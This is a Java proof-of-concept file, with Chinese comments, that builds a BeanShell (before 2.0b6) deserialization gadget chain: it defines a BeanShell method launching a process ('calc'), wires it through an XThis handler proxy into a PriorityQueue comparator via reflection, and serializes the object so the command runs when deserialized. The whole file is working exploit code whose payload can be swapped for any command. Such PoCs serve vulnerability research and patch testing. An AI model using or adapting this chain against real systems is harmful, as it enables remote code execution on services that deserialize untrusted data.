package org.example;

import bsh.Interpreter;
import bsh.XThis;

import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * BeanShell (bsh) before 2.0b6
 */
public class BeanShellPOC {

    public static String fileName = "BeanShell.bin";

    public static void main(String[] args) throws Exception {

        /*
        注意：
        这里不能使用Runtime，因为使用Runtime的话，bsh会使用BSHMethodInvocation，
        只有使用了new 运算符，才会用到BSHAllocationExpression。
         */
        String payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"calc\"}).start();return new Integer(1);}";

        // 将 compare 方法注册至 Interpreter 实例上下文中
        Interpreter i = new Interpreter();
        i.eval(payload);

        // 创建 XThis 对象，获取其 invocationHandler
        XThis xt = new XThis(i.getNameSpace(), i);
        Field handlerField = XThis.class.getDeclaredField("invocationHandler");
        handlerField.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) handlerField.get(xt);

        // 使用 XThis$Handler 为 Comparator 创建动态代理
        Comparator comparator = (Comparator) Proxy.newProxyInstance(
                Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

        PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        Object[] queueData = new Object[]{1, 1};
        Field field = queue.getClass().getDeclaredField("queue");
        field.setAccessible(true);
        field.set(queue, queueData);

        Field field2 = queue.getClass().getDeclaredField("size");
        field2.setAccessible(true);
        field2.set(queue, 2);

        Serializer.serialize(queue, Files.newOutputStream(new File(fileName).toPath()));
        Object deserialize = Deserializer.deserialize(Files.newInputStream(new File(fileName).toPath()));
    }

}